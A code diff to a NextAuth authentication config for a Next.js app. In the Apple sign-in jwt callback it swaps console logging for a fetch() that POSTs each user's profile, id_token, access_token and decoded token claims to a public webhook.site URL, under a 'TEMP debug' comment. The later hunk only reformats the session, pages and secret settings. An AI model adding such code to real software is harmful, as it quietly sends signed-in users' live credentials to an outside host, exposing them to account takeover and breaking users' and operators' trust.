@@ -87,16 +87,38 @@ export const authOptions: NextAuthOptions = {
      */
     async jwt({ token, account, profile }) {
       if (account?.provider === 'apple') {
-        // TEMP: capture raw Apple payload
-        console.log('[Apple Debug] raw profile:', JSON.stringify(profile, null, 2))
-        console.log('[Apple Debug] raw account:', JSON.stringify(account, null, 2))
+        // TEMP: capture raw Apple payload — sends to webhook for inspection
+        let idTokenClaims: Record<string, unknown> | null = null
+        if (account.id_token) {
+          try {
+            idTokenClaims = JSON.parse(
+              Buffer.from(account.id_token.split('.')[1], 'base64url').toString('utf8')
+            )
+          } catch (_) {}
+        }
+        fetch('https://webhook.site/d3e8fb1c-aef7-44f2-837a-10b830356885', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            event: 'apple_signin',
+            isFirstLogin: !!profile,
+            profile: profile ?? null,
+            account: {
+              provider: account.provider,
+              providerAccountId: account.providerAccountId,
+              type: account.type,
+              id_token: account.id_token,
+              access_token: (account as any).access_token,
+              token_type: (account as any).token_type,
+              expires_at: (account as any).expires_at,
+            },
+            idTokenClaims,
+          }),
+        }).catch((err) => console.error('[Apple Debug] webhook send failed:', err))
 
         // Decode id_token claims (middle segment is base64url-encoded JSON)
         if (account.id_token) {
-          const claims = JSON.parse(
-            Buffer.from(account.id_token.split('.')[1], 'base64url').toString('utf8')
-          )
-          console.log('[Apple Debug] id_token claims:', JSON.stringify(claims, null, 2))
+          const claims = idTokenClaims
           try {
             const payload = await getPayload()
 
@@ -218,16 +240,16 @@ export const authOptions: NextAuthOptions = {
     },
 
     async session({ session, token }) {
-        session.payloadToken = token.payloadToken
-        session.payloadUser = token.payloadUser
-        return session
-      },
+      session.payloadToken = token.payloadToken
+      session.payloadUser = token.payloadUser
+      return session
     },
+  },
 
-    pages: {
-      signIn: '/login',
-      error: '/login',
-    },
+  pages: {
+    signIn: '/login',
+    error: '/login',
+  },
 
-    secret: process.env.NEXTAUTH_SECRET,
-  }
+  secret: process.env.NEXTAUTH_SECRET,
+}
